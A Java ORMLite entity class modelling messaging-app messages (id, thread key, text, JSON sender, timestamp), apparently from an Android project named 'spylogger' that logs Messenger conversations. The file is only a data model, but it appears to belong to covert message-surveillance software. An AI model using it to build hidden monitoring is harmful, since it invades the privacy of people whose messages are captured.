package com.gravatasufoca.spylogger.model.messenger;

import com.gravatasufoca.spylogger.model.EntidadeAbstrata;
import com.gravatasufoca.spylogger.model.MensagenInterface;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.table.DatabaseTable;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.Serializable;
import java.util.Date;

import lombok.Getter;
import lombok.Setter;

@Getter
@Setter
@DatabaseTable
public class Messages extends EntidadeAbstrata implements Comparable<Messages>,MensagenInterface {
	private static final long serialVersionUID = -4679985146526783051L;

	public Messages() {
	}

	@Override
	public Serializable getId() {
		return msg_id;
	}

	@DatabaseField(id=true,generatedId=false)
	private String msg_id;

	@DatabaseField()
	private String thread_key;

	@DatabaseField()
	private String text;

	@DatabaseField(columnName="sender")
	private String tsender;

	@DatabaseField(dataType=DataType.DATE_LONG)
	private Date timestamp_ms;

	@DatabaseField(foreign=true, foreignColumnName="thread_key",columnName="thread_key")
	private Thread thread;

	private Sender sender;

	public Sender getSender() {
		if(sender==null){
			if(tsender!=null) {
				try {
					sender = new Sender(new JSONObject(tsender));
				} catch (JSONException e) {
					e.printStackTrace();
				}
			}
		}
		return sender;
	}

	@Override
	public int compareTo(Messages another) {
		if(timestamp_ms.after(another.getTimestamp_ms()))
			return 1;
		else if(timestamp_ms.before(another.getTimestamp_ms()))
			return -1;
		return 0;
	}

}
